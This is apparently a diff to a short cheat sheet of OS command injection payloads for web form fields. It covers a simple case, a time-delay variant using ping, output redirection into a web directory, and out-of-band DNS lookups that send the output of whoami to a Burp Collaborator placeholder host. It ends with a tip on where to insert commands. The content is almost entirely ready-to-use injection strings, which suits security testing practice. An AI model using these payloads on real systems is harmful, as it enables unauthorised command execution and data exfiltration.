@@ -1,2 +1,8 @@
 Simplecase:  --->   filename=subham.txt|whoami
 TimeDelay:   --->   filename=subham.txt|||ping+-c+10+127.0.0.1||
+Output-Redirection ---> email=subham.txt||whoami>/var/www/images/output.txt|| ---> search ----> filename=/var/www/images/subham.txt
+Out-of-band  ---> email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+Out-of-band  ---> email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+
+
+Note:Try removing value of email=subham.txt and check inserting the values after ||----command----||
